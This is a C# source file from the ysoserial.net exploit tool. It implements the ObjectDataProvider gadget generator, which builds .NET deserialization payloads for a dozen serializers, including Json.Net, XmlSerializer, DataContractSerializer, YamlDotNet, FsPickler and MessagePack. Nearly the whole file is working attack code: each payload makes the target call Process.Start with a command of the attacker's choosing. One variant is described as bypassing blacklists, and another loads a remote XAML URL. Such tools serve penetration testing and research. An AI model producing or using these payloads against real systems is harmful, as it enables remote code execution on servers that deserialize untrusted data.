using System;
using System.Collections.Generic;
using fastJSON;
using System.Windows.Markup;
using System.Diagnostics;
using System.Windows.Data;
using System.Reflection;
using System.Collections.Specialized;
using System.Windows;
using ysoserial.Helpers;
using NDesk.Options;
using System.Linq;
using Polenter.Serialization;
using System.Text;

/*
 * NOTEs:
 *  What is Xaml2? 
 *      Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
 *  What is DataContractSerializer2? 
 *      DataContractSerializer2 uses Xaml.Parse rather than using ObjectDataProvider directly (as in DataContractSerializer) which is useful for bypassing blacklists
 * 
 * 
 * */

namespace ysoserial.Generators
{
    public class ObjectDataProviderGenerator : GenericGenerator
    {
        private int variant_number = 1; // Default
        private string xaml_url = "";

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Xaml (4)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml", "MessagePackTypeless", "MessagePackTypelessLz4" };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, 3, ... based on formatter.", v => int.TryParse(v, out variant_number) },
                {"xamlurl=", "This is to create a very short payload when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
            };

            return options;
        }

        public override string Name()
        {
            return "ObjectDataProvider";
        }

        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili, Dane Evans";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeNotDerived };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
            if (formatter.ToLower().Equals("xaml"))
            {
                ProcessStartInfo psi = new ProcessStartInfo();

                psi.FileName = inputArgs.CmdFileName;
                if (inputArgs.HasArguments)
                {
                    psi.Arguments = inputArgs.CmdArguments;
                }

                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                string payload = "";

                if (variant_number == 2)
                {
                    ResourceDictionary myResourceDictionary = new ResourceDictionary();
                    myResourceDictionary.Add("", odp);
                    // XAML serializer can also be exploited!
                    payload = SerializersHelper.Xaml_serialize(myResourceDictionary);

                }
                else if(variant_number == 3)
                {
                    if(xaml_url == "")
                    {
                        Console.WriteLine("Url parameter was not provided.");
                        Console.WriteLine("Try 'ysoserial --fullhelp' for more information.");
                        System.Environment.Exit(-1);
                    }

                    // There are loads of other objects in Presentation that use XAML URLs and they can be used here instead
                    payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";


                }
                else if (variant_number == 4)
                {
                    inputArgs.IsSTAThread = true; // we need STAThreadAttribute here
                    string bridge = SerializersHelper.Xaml_serialize(odp);

                    if (inputArgs.Minify)
                    {
                        // using discardable regex array to make it shorter!
                        bridge = XmlHelper.Minify(bridge, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                    }

                    // There are loads of other objects in Presentation that use ResourceDictionary and they can all be used here instead
                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>";

                }
                else
                {
                    //payload = XamlWriter.Save(odp);
                    payload = SerializersHelper.Xaml_serialize(odp);
                }

                if (inputArgs.Minify)
                {
                    // using discardable regex array to make it shorter!
                    payload = XmlHelper.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                }

                if (inputArgs.Test)
                {
                    if (inputArgs.IsSTAThread)
                    {
                        var staThread = new System.Threading.Thread(delegate ()
                        {
                            try {
                                SerializersHelper.Xaml_deserialize(payload);
                            }
                            catch (Exception err)
                            {
                                Debugging.ShowErrors(inputArgs, err);
                            }

                        });
                        staThread.SetApartmentState(System.Threading.ApartmentState.STA);
                        staThread.Start();
                        staThread.Join();
                    }
                    else
                    {
                        try
                        {
                            SerializersHelper.Xaml_deserialize(payload);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                }
                return payload;
            }
            if (formatter.ToLower().Equals("json.net"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                string cmdPart = "";

                if (inputArgs.HasArguments)
                {
                    cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
                }
                else
                {
                    cmdPart = "'" + inputArgs.CmdFileName + "'";
                }

                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':[" + cmdPart + @"]
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @""",""Arguments"":""" + inputArgs.CmdArguments + @"""";
                }
                else
                {
                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @"""";
                }

                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            " + cmdPart + @"
        }
    },
    ""MethodName"":""Start""
}";

                if (inputArgs.Minify)
                {
                    payload = JsonHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
                }
                else
                {
                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
                }

                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            " + cmdPart + @"
        }
    }
}";

                if (inputArgs.Minify)
                {
                    payload = JsonHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JavaScriptSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xmlserializer"))
            {
                String payload = "";

                if (variant_number == 2)
                {
                    IGenerator tcdGadget = new TypeConfuseDelegateGenerator();
                    string losFormatterPayload = Encoding.UTF8.GetString((byte[]) tcdGadget.GenerateWithNoTest("LosFormatter", inputArgs));
                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Deserialize</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">" + losFormatterPayload + @"</anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfLosFormatterObjectDataProvider>
</root>
";
                }
                else
                {

                    inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                    String cmdPart;

                    if (inputArgs.HasArguments)
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                    }
                    else
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                    }

                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
";
                }


                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null, FormatterType.XMLSerializer, true);
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.XmlSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart, payload;

                if (variant_number == 2)
                {
                    if (inputArgs.HasArguments)
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                    }
                    else
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                    }

                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
      <ExpandedElement z:Id=""ref1"" >
        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
            <a:MethodName>Parse</a:MethodName>
            <a:MethodParameters>
                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </a:MethodParameters>
            <a:ObjectInstance z:Ref=""ref1""/>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
</root>
";
                }
                else if (variant_number == 3)
                {
                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
      <ExpandedElement z:Id=""ref1"" >
        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
            <a:MethodName>Parse</a:MethodName>
            <a:MethodParameters>
                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">xxxxx</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </a:MethodParameters>
            <a:ObjectInstance z:Ref=""ref1""/>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
</root>
";
                }
                else
                {
                    if (inputArgs.HasArguments)
                    {
                        cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
                    }
                    else
                    {
                        cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
                    }

                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
                                                         xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                         xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""
                                                         >
      <ExpandedElement z:Id=""ref1"" >
        <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
      <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
        <a:MethodName>Start</a:MethodName>
        <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
          " + cmdPart + @"
        </a:MethodParameters>
        <a:ObjectInstance z:Ref=""ref1""/>
      </ProjectedProperty0>
    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
</root>
";
                }
                if (inputArgs.Minify)
                {
                    payload = XmlHelper.Minify(payload, null, null, FormatterType.DataContractXML, true);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("yamldotnet"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"FileName: " + inputArgs.CmdFileName + @",
					Arguments: " + inputArgs.CmdArguments;
                }
                else
                {
                    cmdPart = $@"FileName: " + inputArgs.CmdFileName;
                }

                String payload = @"
!<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
    MethodName: Start,
	ObjectInstance: 
		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
			StartInfo:
				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
					" + cmdPart + @"

                }
        }
}";

                if (inputArgs.Minify)
                {
                    payload = YamlDocumentHelper.Minify(payload);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.YamlDotNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fspickler"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                }

                String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";

                internalPayload = CommandArgSplitter.JsonStringEscape(internalPayload);

                String payload = @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
          ""_flags"": ""subtype"",
          ""subtype"": {
            ""Case"": ""NamedType"",
            ""Name"": ""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"",
            ""Assembly"": {
              ""Name"": ""Microsoft.PowerShell.Editor"",
              ""Version"": ""3.0.0.0"",
              ""Culture"": ""neutral"",
              ""PublicKeyToken"": ""31bf3856ad364e35""
            }
          },
          ""instance"": {
            ""serializationEntries"": [
              {
                ""Name"": ""ForegroundBrush"",
                ""Type"": {
                  ""Case"": ""NamedType"",
                  ""Name"": ""System.String"",
                  ""Assembly"": {
                    ""Name"": ""mscorlib"",
                    ""Version"": ""4.0.0.0"",
                    ""Culture"": ""neutral"",
                    ""PublicKeyToken"": ""b77a5c561934e089""
                  }
                },
                ""Value"": """+ internalPayload + @"""
              }
            ]
          }
    }
  }";

                if (inputArgs.Minify)
                {
                    payload = JsonHelper.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        var serializer = MBrace.CsPickler.CsPickler.CreateJsonSerializer(true);
                        serializer.UnPickleOfString<Object>(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLowerInvariant().Equals("sharpserializerbinary") || formatter.ToLowerInvariant().Equals("sharpserializerxml"))
            {
                // Binary Serialization Mode
                ProcessStartInfo psi = new ProcessStartInfo();

                psi.FileName = inputArgs.CmdFileName;
                if (inputArgs.HasArguments)
                {
                    psi.Arguments = inputArgs.CmdArguments;
                }
                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;

                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                // SharpSerializer has bugs and we need to remove unwanted properties from the serializaiton process
                List<KeyValuePair<Type, List<String>>> allExclusions = new List<KeyValuePair<Type, List<string>>>();

                List<String> ourExcludedProperties = p.GetType().GetProperties().Where(x => !x.Name.Equals("StartInfo")).Select(item => item.Name).ToList();
                KeyValuePair<Type, List<String>> exclusionList = new KeyValuePair<Type, List<String>>(p.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                ourExcludedProperties = odp.GetType().GetProperties().Where(x => !x.Name.Equals("MethodName") && !x.Name.Equals("ObjectInstance")).Select(item => item.Name).ToList();
                exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                if (!inputArgs.HasArguments && inputArgs.Minify)
                {
                    ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName")).Select(item => item.Name).ToList();
                }
                else
                {
                    ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName") && !x.Name.Equals("Arguments")).Select(item => item.Name).ToList();
                }

                exclusionList = new KeyValuePair<Type, List<String>>(psi.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                // Why? I don't know but it seems to be another bug
                ourExcludedProperties = new List<String>{"Dispatcher"};
                exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                if (formatter.ToLowerInvariant().Equals("sharpserializerxml"))
                {
                    var serializedData = SerializersHelper.SharpSerializer_Xml_serialize_WithExclusion_ToString(odp, allExclusions);

                    if (inputArgs.Minify)
                    {
                        serializedData = XmlHelper.Minify(serializedData, null, new string[] { @" name=""r""" }, FormatterType.DataContractXML, true);
                    }


                    if (inputArgs.Test)
                    {
                        try
                        {
                            SerializersHelper.SharpSerializer_Xml_deserialize_FromString(serializedData);
                        }
                        catch { }
                    }
                    return serializedData;
                }
                else
                {
                    var serializedData = SerializersHelper.SharpSerializer_Binary_serialize_WithExclusion_ToByteArray(odp, allExclusions);
                    if (inputArgs.Test)
                    {
                        try
                        {
                            SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray(serializedData);
                        }
                        catch { }
                    }
                    return serializedData;
                }
            }
            else if (formatter.ToLowerInvariant().Equals("messagepacktypeless") || formatter.ToLowerInvariant().Equals("messagepacktypelesslz4"))
            {
                if (formatter.ToLowerInvariant().Equals("messagepacktypeless"))
                {
                    var serializedData = MessagePackObjectDataProviderHelper.CreateObjectDataProviderGadget(inputArgs.CmdFileName, inputArgs.CmdArguments, false);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            MessagePackObjectDataProviderHelper.Test(serializedData, false);
                        }
                        catch { }
                    }
                    return serializedData;
                }
                else // LZ4
                {
                    var serializedData = MessagePackObjectDataProviderHelper.CreateObjectDataProviderGadget(inputArgs.CmdFileName, inputArgs.CmdArguments, true);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            MessagePackObjectDataProviderHelper.Test(serializedData, true);
                        }
                        catch { }
                    }
                    return serializedData;
                }
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
